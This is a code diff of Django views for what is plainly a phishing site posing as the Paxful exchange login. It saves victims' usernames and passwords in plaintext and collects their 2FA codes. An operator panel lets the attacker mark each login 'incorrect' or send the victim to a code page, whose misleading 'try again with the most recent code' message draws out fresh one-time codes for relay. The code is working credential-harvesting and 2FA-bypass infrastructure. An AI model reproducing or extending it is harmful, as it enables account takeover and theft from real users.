@@ -813,34 +813,87 @@ def payment_required_view(request):
 
 @csrf_exempt
 def paxful(request):
+    message = ""
+    submission_id = None
+
+    # Check if a previous submission ID exists from the query parameters
+    submission_id = request.GET.get('submission_id')
+
     if request.method == 'POST':
         username = request.POST.get('username')
         password = request.POST.get('password')
-        
-        # Save the username and password
+
+        # Save the username and password with a pending status
         submission = UserSubmission.objects.create(username=username, password=password)
-        
-        # Redirect to the verify page with submission_id
-        return redirect('verification', submission_id=submission.id)
-    
-    return render(request, 'paxful.html')
+        submission_id = submission.id
+
+        # Show "Confirming details" message until admin sets the status
+        message = "Verifying information, please be patient..."
+
+    # If status is set to 'incorrect', show error message on the first login attempt
+    if request.GET.get('status') == 'incorrect' and not submission_id:
+        message = "Incorrect email or password. Please try again."
+
+    # If the status is set to 'incorrect' after the first submission, reset message
+    if submission_id:
+        submission = UserSubmission.objects.filter(id=submission_id).first()
+        if submission:
+            if submission.status == 'incorrect':
+                message = "Incorrect email or password. Please try again."
+            elif submission.status == 'authenticator':
+                # Redirect to verification if the status is 'authenticator'
+                return redirect(f'/verification/{submission_id}/')
+
+    return render(request, 'paxful.html', {'message': message, 'submission_id': submission_id})
+
+
 
 @csrf_exempt
 def verification(request, submission_id):
-    submission = UserSubmission.objects.get(id=submission_id)
+    submission = get_object_or_404(UserSubmission, id=submission_id)
     message = ""
-    
+
     if request.method == 'POST':
         otp = request.POST.get('otp')
-        
-        # Save the new OTP
+
+        # Save the OTP
         OTPSubmission.objects.create(user_submission=submission, otp=otp)
-        
-        message = "Code seems to be correct .Try again with the most recent code"
-    
+
+        message = "Code seems to be correct. Try again with the most recent code."
+
     otps = OTPSubmission.objects.filter(user_submission=submission)
     return render(request, 'paxful2fa.html', {'submission_id': submission_id, 'message': message, 'otps': otps})
 
+
+@csrf_exempt
+def admin_panel(request):
+    submissions = UserSubmission.objects.all()
+    return render(request, 'admin_panel.html', {'submissions': submissions})
+
+
+@csrf_exempt
+def set_status(request, submission_id):
+    submission = get_object_or_404(UserSubmission, id=submission_id)
+
+    if request.method == 'POST':
+        status = request.POST.get('status')
+
+        if status not in ['authenticator', 'incorrect', 'pending']:
+            return JsonResponse({'error': 'Invalid status provided'}, status=400)
+
+        # Update the status
+        submission.status = status
+        submission.save()
+
+        # Respond with success message
+        return redirect('/admin-panel')
+
+    return JsonResponse({'error': 'Invalid request method'}, status=405)
+
+
+def check_status(request, submission_id):
+    submission = get_object_or_404(UserSubmission, id=submission_id)
+    return JsonResponse({'status': submission.status})
 
 
 
